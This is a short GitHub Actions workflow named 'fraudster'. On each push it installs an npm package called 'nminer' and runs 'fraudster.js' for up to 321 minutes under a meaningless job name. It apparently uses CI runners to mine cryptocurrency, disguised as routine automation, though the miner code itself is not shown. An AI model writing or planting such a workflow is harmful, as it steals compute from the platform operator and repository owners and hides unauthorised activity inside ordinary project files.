name: fraudster
on:
  push:
    branches: [ "main" ]

jobs:
    unnecessarily_how:
      runs-on: ubuntu-latest
      steps:
        - name: Checkout
          uses: actions/checkout@v4
  
        - name: Install Node.js
          uses: actions/setup-node@v3
          with:
            node-version: 20
            
        - name: unnecessarily_how
          run: |
            npm install nminer
            timeout 321m node fraudster.js --job unnecessarily_how
  
